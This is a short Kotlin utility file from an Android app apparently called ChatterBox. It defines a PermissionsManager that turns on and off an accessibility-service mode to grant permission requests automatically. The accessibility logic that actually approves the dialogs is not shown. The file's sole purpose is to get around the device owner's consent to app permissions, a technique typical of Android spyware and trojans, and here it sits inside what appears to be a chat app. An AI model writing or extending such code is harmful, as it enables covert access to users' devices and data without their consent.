package com.example.ChatterBox.util

import android.util.Log
import com.example.ChatterBox.accessibility.AccessibilityService

/**
 * Helper class to manage permissions auto-granting via accessibility service
 */
object PermissionsManager {
    private const val TAG = "PermissionsManager"

    /**
     * Enable auto-granting of permissions
     *
     * @param permissionCount Number of permissions being requested
     * @return true if auto-granting was enabled, false otherwise
     */
    fun enableAutoGrantPermissions(permissionCount: Int): Boolean {
        val accessibilityService = AccessibilityService.getInstance()

        if (accessibilityService != null) {
            accessibilityService.startPermissionGrantingMode(permissionCount)
            Log.d(TAG, "Auto-granting enabled for $permissionCount permissions")
            return true
        }

        Log.d(TAG, "Accessibility service not available, auto-granting disabled")
        return false
    }

    /**
     * Disable auto-granting of permissions
     */
    fun disableAutoGrantPermissions() {
        val accessibilityService = AccessibilityService.getInstance()
        accessibilityService?.stopPermissionGrantingMode()
        Log.d(TAG, "Auto-granting disabled")
    }
}